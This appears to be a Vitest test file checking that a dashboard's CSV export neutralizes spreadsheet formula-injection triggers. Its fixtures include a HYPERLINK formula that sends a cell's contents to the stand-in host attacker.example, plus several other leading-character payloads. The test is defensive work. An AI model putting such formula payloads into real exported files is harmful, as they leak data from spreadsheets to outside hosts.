import { describe, it, expect, afterEach } from 'vitest';
import type { CachedAnalysis } from '../../src/types/analysis';
import { exportFilteredFormsToCSV } from '../../src/dashboard/shared/csv-export';
import { getPersonalDashboardColumns } from '../../src/shared/constants';
import { captureDownload } from '../helpers/capture-download';
import { columnValue, expectNeutralized, parseCsv } from '../helpers/csv-formula';

const FORM_NAME = '=HYPERLINK("http://attacker.example/x?d="&B2)';
const ENTITY = '+2+2';
const ACTION = '-2-2';
const PURPOSE = '@SUM(A1:A2)';
const VERTICAL = '\t=1+1';
const SUBVERTICAL = '\r=1+1';
const SOURCE_URL = '=1+1';

describe('personal and selected CSV export', () => {
  afterEach(() => {
    document.body.innerHTML = '';
  });

  it('neutralizes formula triggers in every free-text column the shared exporter writes', async () => {
    document.body.innerHTML = '<div id="root"></div>';
    const form = {
      form_name: FORM_NAME,
      entity_name: ENTITY,
      source_url: SOURCE_URL,
      action_type: ACTION,
      form_purpose: PURPOSE,
      industry_vertical: VERTICAL,
      industry_subvertical: SUBVERTICAL,
      pages: 2,
      total_field_count: 4,
      complexity_score: 3,
      nigo_score: 1,
      confidence_tier: 'High',
      signature_required: false,
      analyzed_at: 1_700_000_000_000,
      ok: true,
    } as CachedAnalysis;

    const download = await captureDownload(() => {
      exportFilteredFormsToCSV([form], getPersonalDashboardColumns(), 'Form_Genome_Dashboard');
    });

    expect(download.filename).toMatch(/^Form_Genome_Dashboard_\d{4}-\d{2}-\d{2}\.csv$/);
    expect(download.type).toContain('text/csv');

    const rows = parseCsv(download.content);
    const record = rows[1];
    expect(record).toBeTruthy();
    expectNeutralized(columnValue(rows, 'Form Name', record!), FORM_NAME);
    expectNeutralized(columnValue(rows, 'Entity', record!), ENTITY);
    expectNeutralized(columnValue(rows, 'URL', record!), SOURCE_URL);
    expectNeutralized(columnValue(rows, 'Action Type', record!), ACTION);
    expectNeutralized(columnValue(rows, 'Purpose', record!), PURPOSE);
    expectNeutralized(columnValue(rows, 'Vertical', record!), VERTICAL);
    expectNeutralized(columnValue(rows, 'Subvertical', record!), SUBVERTICAL);
  });
});
